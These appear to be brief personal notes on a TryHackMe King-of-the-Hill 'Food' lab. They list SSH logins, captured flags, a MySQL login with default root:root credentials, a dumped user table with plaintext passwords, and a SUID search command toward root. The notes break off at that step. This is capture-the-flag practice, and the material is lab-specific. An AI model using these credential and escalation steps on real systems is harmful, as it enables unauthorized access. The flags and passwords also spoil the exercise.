THM-Koth-Food -->

ssh credential:
pasta:pastaisdynamic 
ramen:noodlesRTheBest


Food-Flags:

Get flag1 under / home/bread
thm{7baf5aa8491a4b7b1c2d231a24aec575}


Pass the linpeas enumeration authorization information and find that mysql uses the default login password: root:root
/tmp$ mysql -u root -p

Get the login credentials of flag2 and ramen

mysql> select * from user;
ERROR 1146 (42S02): Table 'users.user' doesn't exist
mysql> select * from User;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | thm{2f30841ff8d9646845295135adda8332} |
+----------+---------------------------------------+

flag2
thm{2f30841ff8d9646845295135adda8332}

Find the hidden file flag3 under / home/food

flag3
thm{58a3cb46855af54d0660b34fd20a04c1}


Raise authority to root
find all suid:
/tmp$ find / -perm -u=s -type f 2>/dev/null

--END--